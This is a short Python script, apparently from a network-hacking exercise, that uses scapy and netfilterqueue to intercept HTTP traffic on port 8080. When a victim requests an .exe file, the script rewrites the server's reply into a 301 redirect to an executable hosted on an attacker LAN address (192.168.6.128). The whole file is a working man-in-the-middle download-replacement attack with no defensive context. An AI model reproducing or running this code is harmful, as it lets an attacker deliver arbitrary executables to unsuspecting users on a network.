import scapy.all as scapy
import netfilterqueue
import time

ack_list = []
def set_load(packet,load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum


	return packet


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 8080:
			if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.6.128" not in scapy_packet[scapy.Raw].load:
				print("[+] HTTP Request","on PORT :",8080)
				print("[+] .exe found \n\n\n")
				ack_list.append(scapy_packet[scapy.TCP].ack)
				print(scapy_packet.show())

		elif scapy_packet[scapy.TCP].sport == 8080:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing file")
				print(scapy_packet.show())
				modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.6.128/vs/FolderColorizer2.exe\n\n")
				packet.set_payload(bytes(modified_packet))
				print("modefied packet",modified_packet)
				time.sleep(1)
				print("[+] Replaced !")


	packet.accept() 

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()

